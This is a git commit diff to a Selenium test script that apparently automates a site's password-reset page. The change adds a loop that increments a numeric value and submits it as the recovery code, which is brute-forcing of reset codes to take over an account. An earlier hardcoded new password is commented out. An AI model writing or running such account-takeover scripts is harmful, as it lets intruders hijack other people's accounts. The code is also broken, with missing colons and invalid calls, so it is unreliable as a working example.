f680d88b29d48c2a412b74e3053f7481bd7a5455
krarktel112 <krarktel@gmail.com>
2024-08-08 14:08:04 -0400

    Update Test.py

--- Test.py
+++ Test.py
@@ -4,7 +4,7 @@ from selenium.webdriver.firefox.service import Service
 
 """usr=input('Enter Email Id:') """
 """pwd=input('Enter Password:')"""
-x = 99999999
+x = 10000000
 def driver(request):
     """Set up webdriver fixture."""
     usr=input('Enter Email Id:')
@@ -26,8 +26,19 @@ def driver(request):
     cont = find_element(By.NAME, 'reset_action')
     cont.click()
     y = find_element(By.Class, '_585r_50f4')
-    input = find_element(By.ID, 'password_new')
-    input = send_keys('!04Hp9004')
+    z = find_element(By.Class, '_585r_50f4')
+    while z == y
+        x += 1
+        driver.implicitly_wait(10)
+        input = find_element(By.ID, 'recovery_code_entry')
+        input = send_keys(x)
+        cont = find_element(By.NAME, 'reset_action')
+        cont.click()
+        input = send_keys(x)
+        if x == 10000002
+            break
+    """input = find_element(By.ID, 'password_new')"""
+    """input = send_keys('!04Hp9004')"""
 
     yield driver
     yield y
